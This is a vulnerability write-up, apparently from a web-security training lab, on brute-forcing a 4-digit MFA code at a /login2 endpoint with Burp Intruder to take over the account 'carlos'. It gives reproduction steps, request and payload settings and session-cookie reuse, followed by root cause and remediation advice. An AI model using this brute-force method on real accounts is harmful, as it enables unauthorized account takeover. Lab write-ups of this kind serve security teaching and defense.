# MFA Brute Force Leading to Account Takeover

## Summary

The application's Multi-Factor Authentication (MFA) mechanism is vulnerable to brute-force attacks. The MFA verification endpoint allows **unlimited attempts** to guess a **4-digit authentication code** without implementing rate limiting, account lockout, or anti-automation protections.

Because of this weakness, an attacker can systematically try every possible code until the correct one is discovered.

During testing, it was possible to brute force the MFA code for the victim account **Carlos** and gain full access to the account.

---

# Vulnerability Details

## Affected Endpoint

```
POST /login2
```

## Vulnerable Parameter

```
mfa-code
```

The application accepts a **4-digit MFA code** but does not restrict the number of attempts or introduce delays between failed requests.

This allows an attacker to attempt all possible combinations:

```
0000 – 9999
```

Total possible combinations:

```
10,000
```

Because the server processes every request normally without rate limiting, automated tools can brute force the correct code.

---

# Tools Used

- Burp Suite
- Burp Intruder
- Browser Developer Tools

---

# Steps to Reproduce

## 1. Login with Valid Credentials

Login using the victim credentials.

```
Username: carlos
Password: montoya
```

After successful login, the application redirects to the **MFA verification page**.

---

## 2. Intercept the MFA Verification Request

Capture the request sent to the MFA endpoint.

Example request:

```http
POST /login2 HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&mfa-code=1234
```

---

## 3. Send the Request to Burp Intruder

1. Right-click the request.
2. Send it to **Intruder**.
3. Select the `mfa-code` parameter as the **payload position**.

Payload example:

```
csrf=TOKEN&mfa-code=§1234§
```

---

## 4. Configure the Payload

Use a **numeric payload list** covering all possible 4-digit combinations.

```
0000 → 9999
```

Payload settings:

- Payload Type: Numbers
- From: 0000
- To: 9999
- Step: 1

---

## 5. Start the Brute Force Attack

Run the attack to test all possible MFA codes.

### Response Behavior

Incorrect codes return:

```
HTTP/1.1 200 OK
```

Correct code returns:

```
HTTP/1.1 302 Found
Location: /my-account
```

During testing, the correct MFA code was identified as:

```
0026
```

---

## 6. Capture the Authenticated Session

Once the correct code is submitted, the server returns a valid authenticated session cookie.

Example response header:

```
Set-Cookie: session=VALID_SESSION
```

---

## 7. Use the Session Cookie

Insert the authenticated session cookie into the browser.

Example:

```
Cookie: session=VALID_SESSION
```

After refreshing the page, the attacker gains access to the victim's account.

Result:

```
Logged in as Carlos
```

---

# Proof of Concept

Example brute-force payload range:

```
0000
0001
0002
0003
...
0026  ← Valid code
...
9999
```

Successful response:

```
HTTP/1.1 302 Found
Location: /my-account
```

---

# Impact

This vulnerability allows attackers to **bypass MFA protection** and gain unauthorized access to user accounts.

Possible impacts include:

- Full **account takeover**
- Access to **sensitive user data**
- Ability to perform actions **as the victim**
- Possible **privilege escalation** if administrative accounts are targeted

Because the MFA code space is small (**4 digits**) and no protections exist, brute forcing becomes practical and reliable.

---

# Root Cause

The MFA verification endpoint lacks critical security protections:

- No **rate limiting**
- No **account lockout** after repeated failures
- No **CAPTCHA or anti-automation protection**
- Very **small MFA code space (4 digits)**

---

# Remediation

The following mitigations should be implemented to prevent brute force attacks.

## 1. Implement Rate Limiting

Restrict the number of MFA attempts per account and IP address.

Example:

```
Maximum 5 attempts per minute
```

---

## 2. Implement Account Lockout

Temporarily lock accounts after multiple failed MFA attempts.

Example:

```
Lock account after 5 failed attempts
```

---

## 3. Add CAPTCHA Protection

Introduce CAPTCHA challenges after several failed authentication attempts to prevent automated attacks.

---

## 4. Increase Code Complexity

Use longer MFA codes such as:

```
6–8 digit OTP
```

---

## 5. Use Time-Based One-Time Passwords

Implement **TOTP (Time-Based One-Time Password)** solutions such as authenticator apps instead of static numeric codes.

Examples include:

- Google Authenticator
- Microsoft Authenticator
- Authy

---

# Severity

**High**

### Justification

- Allows **complete account takeover**
- **Bypasses MFA protection**
- Exploitable **remotely**
- Requires **minimal attacker resources**
- No protection against **automation or brute force attacks**